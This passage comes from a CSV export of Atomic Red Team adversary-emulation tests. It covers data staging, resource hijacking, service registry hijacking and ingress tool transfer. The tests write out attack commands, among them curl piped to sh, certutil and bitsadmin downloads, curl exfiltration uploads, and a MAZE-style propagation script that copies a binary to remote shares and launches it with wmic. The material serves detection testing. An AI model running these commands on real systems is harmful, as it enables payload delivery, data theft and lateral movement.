input_arguments.output_file.type: path

input_arguments.output_file.default: $env:TEMP\discovery.bat

"
T1074.001,Data Staged: Local Data Staging,Stage data from Discovery.sh,39ce0303-ae16-4b9e-bb5b-4f53e8262066,"Utilize curl to download discovery.sh and execute a basic information gathering shell script
",linux,macos,,"curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}
",sh,,,"rm #{output_file}
",sh,"dependencies.0.description: Check if curl is installed on the machine.

dependencies.0.prereq_command: if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi

dependencies.0.get_prereq_command: which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl

","input_arguments.output_file.description: Location to save downloaded discovery.bat file

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1074.001_discovery.log

"
T1074.001,Data Staged: Local Data Staging,Zip a Folder with PowerShell for Staging in Temp,a57fbe4b-3440-452a-88a7-943531ac872a,"Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
was placed in the temp directory.
",windows,,,"Compress-Archive -Path ""#{input_file}"" -DestinationPath #{output_file} -Force
",powershell,,,"Remove-Item -Path #{output_file} -ErrorAction Ignore
",,,"input_arguments.output_file.description: Location to save zipped file or folder

input_arguments.output_file.type: path

input_arguments.output_file.default: $env:TEMP\Folder_to_zip.zip

input_arguments.input_file.description: Location of file or folder to zip

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder\T1074.001\bin\Folder_to_zip

"
T1496,Resource Hijacking,FreeBSD/macOS/Linux - Simulate CPU Load with Yes,904a5a0e-fb02-490d-9f8d-0e256eb37549,"This test simulates a high CPU load as you might observe during cryptojacking attacks.
End the test by using CTRL/CMD+C to break.
",linux,macos,,"yes > /dev/null
",sh,,,,,,
T1574.011,Hijack Execution Flow: Services Registry Permissions Weakness,Service Registry Permissions Weakness,f7536d63-7fd4-466f-89da-7e48d550752a,"Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.
reg add ""HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"" /f /v ImagePath /d ""C:\temp\AtomicRedteam.exe""
",windows,,,"get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
",powershell,,,,,,"input_arguments.weak_service_name.description: weak service check

input_arguments.weak_service_name.type: string

input_arguments.weak_service_name.default: weakservicename

"
T1574.011,Hijack Execution Flow: Services Registry Permissions Weakness,Service ImagePath Change with reg.exe,f38e9eea-e1d7-4ba6-b716-584791963827,"Change Service registry ImagePath of a bengin service to a malicious file
",windows,,,"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"" /f /v ImagePath /d ""#{malicious_service_path}""
",command_prompt,,,"sc.exe delete #{weak_service_name}
",powershell,"dependencies.0.description: The service must exist (#{weak_service_name})

dependencies.0.prereq_command: if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: sc.exe create #{weak_service_name} binpath= ""#{weak_service_path}""

","input_arguments.weak_service_name.description: weak service name

input_arguments.weak_service_name.type: string

input_arguments.weak_service_name.default: calcservice

input_arguments.weak_service_path.description: weak service path

input_arguments.weak_service_path.type: string

input_arguments.weak_service_path.default: %windir%\system32\win32calc.exe

input_arguments.malicious_service_path.description: malicious service path

input_arguments.malicious_service_path.type: string

input_arguments.malicious_service_path.default: %windir%\system32\cmd.exe

"
T1105,Ingress Tool Transfer,rsync remote file copy (push),0fc6e977-cb12-44f6-b263-2824ba917409,"Utilize rsync to perform a remote file copy (push)
",linux,macos,,"rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
",sh,True,,,sh,"dependencies.0.description: rsync must be installed on the machine 

dependencies.0.prereq_command: if [ -x ""$(command -v rsync)"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: (pkg install -y rsync)||(sudo apt-get -y install rsync)

","input_arguments.remote_path.description: Remote path to receive rsync

input_arguments.remote_path.type: path

input_arguments.remote_path.default: /tmp/victim-files

input_arguments.remote_host.description: Remote host to copy toward

input_arguments.remote_host.type: string

input_arguments.remote_host.default: victim-host

input_arguments.local_path.description: Path of folder to copy

input_arguments.local_path.type: path

input_arguments.local_path.default: /tmp/adversary-rsync/

input_arguments.username.description: User account to authenticate on remote host

input_arguments.username.type: string

input_arguments.username.default: victim

"
T1105,Ingress Tool Transfer,rsync remote file copy (pull),3180f7d5-52c0-4493-9ea0-e3431a84773f,"Utilize rsync to perform a remote file copy (pull)
",linux,macos,,"rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
",sh,,,,sh,"dependencies.0.description: rsync must be installed on the machine 

dependencies.0.prereq_command: if [ -x ""$(command -v rsync)"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: (pkg install -y rsync)||(sudo apt-get -y install rsync)

","input_arguments.remote_path.description: Path of folder to copy

input_arguments.remote_path.type: path

input_arguments.remote_path.default: /tmp/adversary-rsync/

input_arguments.remote_host.description: Remote host to copy from

input_arguments.remote_host.type: string

input_arguments.remote_host.default: adversary-host

input_arguments.local_path.description: Local path to receive rsync

input_arguments.local_path.type: path

input_arguments.local_path.default: /tmp/victim-files

input_arguments.username.description: User account to authenticate on remote host

input_arguments.username.type: string

input_arguments.username.default: adversary

"
T1105,Ingress Tool Transfer,scp remote file copy (push),83a49600-222b-4866-80a0-37736ad29344,"Utilize scp to perform a remote file copy (push)
",linux,macos,,"scp #{local_file} #{username}@#{remote_host}:#{remote_path}
",sh,,,,,,"input_arguments.remote_path.description: Remote path to receive scp

input_arguments.remote_path.type: path

input_arguments.remote_path.default: /tmp/victim-files/

input_arguments.local_file.description: Path of file to copy

input_arguments.local_file.type: path

input_arguments.local_file.default: /tmp/adversary-scp

input_arguments.remote_host.description: Remote host to copy toward

input_arguments.remote_host.type: string

input_arguments.remote_host.default: victim-host

input_arguments.username.description: User account to authenticate on remote host

input_arguments.username.type: string

input_arguments.username.default: victim

"
T1105,Ingress Tool Transfer,scp remote file copy (pull),b9d22b9a-9778-4426-abf0-568ea64e9c33,"Utilize scp to perform a remote file copy (pull)
",linux,macos,,"scp #{username}@#{remote_host}:#{remote_file} #{local_path}
",sh,,,,,,"input_arguments.remote_host.description: Remote host to copy from

input_arguments.remote_host.type: string

input_arguments.remote_host.default: adversary-host

input_arguments.local_path.description: Local path to receive scp

input_arguments.local_path.type: path

input_arguments.local_path.default: /tmp/victim-files/

input_arguments.remote_file.description: Path of file to copy

input_arguments.remote_file.type: path

input_arguments.remote_file.default: /tmp/adversary-scp

input_arguments.username.description: User account to authenticate on remote host

input_arguments.username.type: string

input_arguments.username.default: adversary

"
T1105,Ingress Tool Transfer,sftp remote file copy (push),f564c297-7978-4aa9-b37a-d90477feea4e,"Utilize sftp to perform a remote file copy (push)
",linux,macos,,"sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
",sh,,,,,,"input_arguments.remote_path.description: Remote path to receive sftp

input_arguments.remote_path.type: path

input_arguments.remote_path.default: /tmp/victim-files/

input_arguments.local_file.description: Path of file to copy

input_arguments.local_file.type: path

input_arguments.local_file.default: /tmp/adversary-sftp

input_arguments.remote_host.description: Remote host to copy toward

input_arguments.remote_host.type: string

input_arguments.remote_host.default: victim-host

input_arguments.username.description: User account to authenticate on remote host

input_arguments.username.type: string

input_arguments.username.default: victim

"
T1105,Ingress Tool Transfer,sftp remote file copy (pull),0139dba1-f391-405e-a4f5-f3989f2c88ef,"Utilize sftp to perform a remote file copy (pull)
",linux,macos,,"sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
",sh,,,,,,"input_arguments.remote_host.description: Remote host to copy from

input_arguments.remote_host.type: string

input_arguments.remote_host.default: adversary-host

input_arguments.local_path.description: Local path to receive sftp

input_arguments.local_path.type: path

input_arguments.local_path.default: /tmp/victim-files/

input_arguments.remote_file.description: Path of file to copy

input_arguments.remote_file.type: path

input_arguments.remote_file.default: /tmp/adversary-sftp

input_arguments.username.description: User account to authenticate on remote host

input_arguments.username.type: string

input_arguments.username.default: adversary

"
T1105,Ingress Tool Transfer,certutil download (urlcache),dd3b61dd-7bbc-48cd-ab51-49ad1a776df0,"Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!
",windows,,,"cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
",command_prompt,,,"del #{local_path} >nul 2>&1
",,,"input_arguments.remote_file.description: URL of file to copy

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

input_arguments.local_path.description: Local path to place file

input_arguments.local_path.type: path

input_arguments.local_path.default: Atomic-license.txt

"
T1105,Ingress Tool Transfer,certutil download (verifyctl),ffd492e3-0455-4518-9fb1-46527c9f241b,"Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!
",windows,,,"$datePath = ""certutil-$(Get-Date -format yyyy_MM_dd)""
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike ""*.txt""} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
",powershell,,,"Remove-Item ""certutil-$(Get-Date -format yyyy_MM_dd)"" -Force -Recurse -ErrorAction Ignore
",,,"input_arguments.remote_file.description: URL of file to copy

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

input_arguments.local_path.description: Local path to place file

input_arguments.local_path.type: path

input_arguments.local_path.default: Atomic-license.txt

"
T1105,Ingress Tool Transfer,Windows - BITSAdmin BITS Download,a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b,"This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.
This technique is used by Qbot malware to download payloads.
",windows,,,"C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
",command_prompt,,,,,,"input_arguments.bits_job_name.description: Name of the created BITS job

input_arguments.bits_job_name.type: string

input_arguments.bits_job_name.default: qcxjb7

input_arguments.local_path.description: Local path to place file

input_arguments.local_path.type: path

input_arguments.local_path.default: %temp%\Atomic-license.txt

input_arguments.remote_file.description: URL of file to copy

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

"
T1105,Ingress Tool Transfer,Windows - PowerShell Download,42dc4460-9aa6-45d3-b1a6-3955d34e1fe8,"This test uses PowerShell to download a payload.
This technique is used by multiple adversaries and malware families.
",windows,,,"(New-Object System.Net.WebClient).DownloadFile(""#{remote_file}"", ""#{destination_path}"")
",powershell,,,"Remove-Item #{destination_path} -Force -ErrorAction Ignore
",,,"input_arguments.remote_file.description: URL of file to copy

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

input_arguments.destination_path.description: Destination path to file

input_arguments.destination_path.type: path

input_arguments.destination_path.default: $env:TEMP\Atomic-license.txt

"
T1105,Ingress Tool Transfer,OSTAP Worming Activity,2ca61766-b456-4fcf-a35a-1233685e1cad,"OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.
",windows,,,"pushd #{destination_path}
echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js
CScript.exe AtomicTestT1105.js //E:JScript
del AtomicTestT1105.js /Q >nul 2>&1
del AtomicTestFileT1105.js /Q >nul 2>&1
popd
",command_prompt,True,,,,,"input_arguments.destination_path.description: Path to create remote file at. Default is local admin share.

input_arguments.destination_path.type: string

input_arguments.destination_path.default: \\localhost\C$

"
T1105,Ingress Tool Transfer,svchost writing a file to a UNC path,fa5a2759-41d7-4e13-a19c-e8f28a53566f,"svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
Upon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\`, then execute svchost.exe with output to a txt file.
",windows,,,"copy C:\Windows\System32\cmd.exe C:\svchost.exe
C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
",command_prompt,True,,"del C:\T1105.txt >nul 2>&1
del C:\\svchost.exe >nul 2>&1
",,,
T1105,Ingress Tool Transfer,Download a File with Windows Defender MpCmdRun.exe,815bef8b-bf91-4b67-be4c-abe4c2a94ccc,"Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).
The input arguments ""remote_file"" and ""local_path"" can be used to specify the download URL and the name of the output file.
By default, the test downloads the Atomic Red Team license file to the temp directory.

More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
",windows,,,"cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*""
MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}
",command_prompt,,,"del #{local_path} >nul 2>&1
del %temp%\MpCmdRun.log >nul 2>&1",,"dependencies.0.description: Must have a Windows Defender version with MpCmdRun.exe installed
dependencies.0.prereq_command: cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*""
MpCmdRun.exe /?  >nul 2>&1

dependencies.0.get_prereq_command: Echo ""A version of Windows Defender with MpCmdRun.exe must be installed manually""
","input_arguments.remote_file.description: URL of file to download

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

input_arguments.local_path.description: Location to save downloaded file

input_arguments.local_path.type: path

input_arguments.local_path.default: %temp%\Atomic-license.txt

"
T1105,Ingress Tool Transfer,whois file download,c99a829f-0bb8-4187-b2c6-d47d1df74cab,"Download a remote file using the whois utility
",linux,macos,,"timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} ""#{query}"" > #{output_file}
",sh,False,,"rm -f #{output_file}
",,"dependencies.0.description: The whois and timeout commands must be present

dependencies.0.prereq_command: which whois && which timeout

dependencies.0.get_prereq_command: echo ""Please install timeout and the whois package""

","input_arguments.remote_host.description: Remote hostname or IP address

input_arguments.remote_host.type: string

input_arguments.remote_host.default: localhost

input_arguments.remote_port.description: Remote port to connect to

input_arguments.remote_port.type: integer

input_arguments.remote_port.default: 8443

input_arguments.output_file.description: Path of file to save output to

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1105.whois.out

input_arguments.query.description: Query to send to remote server

input_arguments.query.type: string

input_arguments.query.default: Hello from Atomic Red Team test T1105

input_arguments.timeout.description: Timeout period before ending process (seconds)

input_arguments.timeout.type: integer

input_arguments.timeout.default: 1

"
T1105,Ingress Tool Transfer,File Download via PowerShell,54a4daf1-71df-4383-9ba7-f1a295d8b6d2,"Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.
",windows,,,"(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
",powershell,,,,,,"input_arguments.target_remote_file.description: File to download

input_arguments.target_remote_file.type: url

input_arguments.target_remote_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt

input_arguments.output_file.description: File to write to

input_arguments.output_file.type: string

input_arguments.output_file.default: LICENSE.txt

"
T1105,Ingress Tool Transfer,File download with finger.exe on Windows,5f507e45-8411-4f99-84e7-e38530c45d01,"Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
Because this is being tested on the localhost, you should not be expecting a successful connection
https://www.exploit-db.com/exploits/48815
https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
",windows,,,"finger base64_filedata@#{remote_host}
",command_prompt,,,,,,"input_arguments.remote_host.description: Remote hostname or IP address

input_arguments.remote_host.type: string

input_arguments.remote_host.default: localhost

"
T1105,Ingress Tool Transfer,Download a file with IMEWDBLD.exe,1a02df58-09af-4064-a765-0babe1a0d1e2,"Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.
Downloaded files can be found in ""%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>"" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.
Run ""Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue"" without quotes and adding the correct username and file name to locate the file.
",windows,,,"$imewdbled = $env:SystemRoot + ""\System32\IME\SHARED\IMEWDBLD.exe""
& $imewdbled #{remote_url}
",powershell,,,"$inetcache = $env:LOCALAPPDATA + ""\Microsoft\Windows\INetCache\"" 
$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)
if("""" -ne ""$file_to_be_removed"") { Remove-Item ""$file_to_be_removed"" -ErrorAction Ignore }
",,,"input_arguments.remote_url.description: Location of file to be downloaded.

input_arguments.remote_url.type: url

input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml

input_arguments.file_name.description: Name of the file to be downloaded without extension.

input_arguments.file_name.type: string

input_arguments.file_name.default: T1105

"
T1105,Ingress Tool Transfer,Curl Download File,2b080b99-0deb-4d51-af0f-833d37c4ca6a,"The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.
Expected output will include whether the file downloaded successfully or not.
",windows,,,"#{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
#{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
#{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
#{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
",command_prompt,,,"del c:\users\public\music\allthethingsx64.dll >nul 2>&1
del c:\users\public\music\allthethingsx64.dll >nul 2>&1
del c:\programdata\allthethingsx64.dll >nul 2>&1
del %Temp%\allthethingsx64.dll >nul 2>&1
",powershell,"dependencies.0.description: Curl must be installed on system.

dependencies.0.prereq_command: if (Test-Path #{curl_path}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest ""https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip"" -Outfile ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip""
Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\curl""
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe"" C:\Windows\System32\Curl.exe
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl""
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip""

","input_arguments.file_download.description: File to download

input_arguments.file_download.type: string

input_arguments.file_download.default: https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll

input_arguments.curl_path.description: path to curl.exe

input_arguments.curl_path.type: path

input_arguments.curl_path.default: C:\Windows\System32\Curl.exe

"
T1105,Ingress Tool Transfer,Curl Upload File,635c9a38-6cbf-47dc-8615-3810bc1167cf,"The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration
Expected output will include whether the file uploaded successfully or not.
",windows,,,"#{curl_path} -T #{file_path} #{remote_destination}
#{curl_path} --upload-file #{file_path} #{remote_destination}
#{curl_path} -d #{file_path} #{remote_destination}
#{curl_path} --data #{file_path} #{remote_destination}
",command_prompt,,,,powershell,"dependencies.0.description: Curl must be installed on system.

dependencies.0.prereq_command: if (Test-Path #{curl_path}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest ""https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip"" -Outfile PathToAtomicsFolder\..\ExternalPayloads\curl.zip
Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\curl""
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe"" C:\Windows\System32\Curl.exe
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl""
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip""

dependencies.1.description: A file must be created to upload

dependencies.1.prereq_command: if (Test-Path #{file_path}) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: echo ""This is an Atomic Test File"" > #{file_path}

","input_arguments.curl_path.description: path to curl.exe

input_arguments.curl_path.type: path

input_arguments.curl_path.default: C:\Windows\System32\Curl.exe

input_arguments.remote_destination.description: Remote destination

input_arguments.remote_destination.type: string

input_arguments.remote_destination.default: www.example.com

input_arguments.file_path.description: File to upload

input_arguments.file_path.type: string

input_arguments.file_path.default: c:\temp\atomictestfile.txt

"
T1105,Ingress Tool Transfer,Download a file with Microsoft Connection Manager Auto-Download,d239772b-88e2-4a2e-8473-897503401bcc,"Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. 
The issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.
Upon successful execution the test will open calculator and Notepad executable for 10 seconds.
reference:
https://twitter.com/ElliotKillick/status/1455897435063074824
https://github.com/LOLBAS-Project/LOLBAS/pull/151
https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/
https://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html
",windows,,,"""#{Path_to_file}"" 1>NUL 
",command_prompt,,,"del /f/s/q %temp%\T1105 >nul 2>&1
rmdir /s/q %temp%\T1105 >nul 2>&1
",powershell,"dependencies.0.description: #{Path_to_file} must exist on system.

dependencies.0.prereq_command: if (Test-Path ""#{Path_to_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{Path_to_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat"" -OutFile ""#{Path_to_file}""

","input_arguments.Path_to_file.description: Path to the Batch script

input_arguments.Path_to_file.type: path

input_arguments.Path_to_file.default: PathToAtomicsFolder\T1105\src\T1105.bat

"
T1105,Ingress Tool Transfer,MAZE Propagation Script,70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf,"This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\Temp directory of each one. 
Upon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.
Reference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html 
",windows,,,"$machine_list = ""PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt""
$offline_list = ""PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt""
$completed_list = ""PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt""
foreach ($machine in get-content -path ""$machine_list"")
{if (test-connection -Count 1 -computername $machine -quiet) 
{cmd /c copy ""#{binary_file}"" ""\\$machine\#{remote_drive_letter}$#{exe_remote_folder}""
echo $machine >> ""$completed_list""
wmic /node: ""$machine"" process call create ""regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}""}
else
{echo $machine >> ""$offline_list""}}
",powershell,,,"if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt"") 
{foreach ($machine in get-content -path ""PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt"")
{wmic /node: ""$machine"" process where name='""regsvr32.exe""' call terminate | out-null
Remove-Item -path ""\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"" -force -erroraction silentlycontinue}}
Remove-Item -path ""PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt"" -erroraction silentlycontinue
Remove-item -path ""PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt"" -erroraction silentlycontinue
",powershell,"dependencies.0.description: Binary file must exist at specified location (#{binary_file})

dependencies.0.prereq_command: if (Test-Path #{binary_file}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: write-host ""The binary_file input parameter must be set to a binary that exists on this computer.""

dependencies.1.description: Machine list must exist at specified location (""PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt"")

dependencies.1.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
new-item -path ""PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt"" | Out-Null
echo ""A machine list file has been generated at ""PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt"". Please enter the machines to target there, one machine per line.""

","input_arguments.binary_file.description: Binary file to copy to remote machines

input_arguments.binary_file.type: string

input_arguments.binary_file.default: $env:comspec

input_arguments.exe_remote_folder.description: Path to store executable on remote machine (no drive letter)

input_arguments.exe_remote_folder.type: string

input_arguments.exe_remote_folder.default: \Windows\Temp\T1105.exe

input_arguments.remote_drive_letter.description: Remote drive letter

input_arguments.remote_drive_letter.type: string

input_arguments.remote_drive_letter.default: C

"
T1105,Ingress Tool Transfer,Printer Migration Command-Line Tool UNC share folder into a zip file,49845fc1-7961-4590-a0f0-3dbcf065ae7e,"Create a ZIP file from a folder in a remote drive
",windows,,,"del %TEMP%\PrintBrm.zip >nul 2>&1 
#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE
",command_prompt,,,"del %TEMP%\PrintBrm.zip >nul 2>&1
",,,"input_arguments.Path_unc.description: Path to the UNC folder

input_arguments.Path_unc.type: path

input_arguments.Path_unc.default: \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\

input_arguments.Path_PrintBrm.description: Path to PrintBrm.exe

input_arguments.Path_PrintBrm.type: path

input_arguments.Path_PrintBrm.default: C:\Windows\System32\spool\tools\PrintBrm.exe

"
T1105,Ingress Tool Transfer,Lolbas replace.exe use to copy file,54782d65-12f0-47a5-b4c1-b70ee23de6df,"Copy file.cab to destination
Reference: https://lolbas-project.github.io/lolbas/Binaries/Replace/
",windows,,,"del %TEMP%\redcanary.cab >nul 2>&1
#{Path_replace} ""#{replace_cab}"" %TEMP% /A
",command_prompt,,,"del %TEMP%\redcanary.cab >nul 2>&1
",powershell,"dependencies.0.description: #{replace_cab} must exist on system.

dependencies.0.prereq_command: if (Test-Path ""#{replace_cab}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{replace_cab}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab"" -OutFile ""#{replace_cab}""

","input_arguments.replace_cab.description: Path to the cab file

input_arguments.replace_cab.type: path

input_arguments.replace_cab.default: PathToAtomicsFolder\T1105\src\redcanary.cab

input_arguments.Path_replace.description: Path to replace.exe

input_arguments.Path_replace.type: path

input_arguments.Path_replace.default: C:\Windows\System32\replace.exe

"
T1105,Ingress Tool Transfer,Lolbas replace.exe use to copy UNC file,ed0335ac-0354-400c-8148-f6151d20035a,"Copy UNC file to destination
Reference: https://lolbas-project.github.io/lolbas/Binaries/Replace/
",windows,,,"del %TEMP%\redcanary.cab >nul 2>&1
#{Path_replace} #{replace_cab} %TEMP% /A
",command_prompt,,,"del %TEMP%\redcanary.cab >nul 2>&1
",,,"input_arguments.replace_cab.description: UNC Path to the cab file

input_arguments.replace_cab.type: path

input_arguments.replace_cab.default: \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab

input_arguments.Path_replace.description: Path to replace.exe

input_arguments.Path_replace.type: path

input_arguments.Path_replace.default: C:\Windows\System32\replace.exe

"
T1105,Ingress Tool Transfer,certreq download,6fdaae87-c05b-42f8-842e-991a74e8376b,Use certreq to download a file from the web,windows,,,certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path},command_prompt,,,del #{local_path} >nul 2>&1,,,"input_arguments.local_path.description: Local path to place file

input_arguments.local_path.type: string

input_arguments.local_path.default: %temp%\Atomic-license.txt

input_arguments.remote_file.description: URL of file to copy

input_arguments.remote_file.type: url

input_arguments.remote_file.default: https://example.com

"
T1105,Ingress Tool Transfer,Download a file using wscript,97116a3f-efac-4b26-8336-b9cb18c45188,Use wscript to run a local VisualBasic file to download a remote file,windows,,,"wscript.exe ""#{vbscript_file}""
",command_prompt,,,del Atomic-License.txt >nul 2>&1,powershell,"dependencies.0.description: #{vbscript_file} must be exist on system.

dependencies.0.prereq_command: if (Test-Path ""#{vbscript_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{vbscript_file}"") -ErrorAction ignore | Out-Null
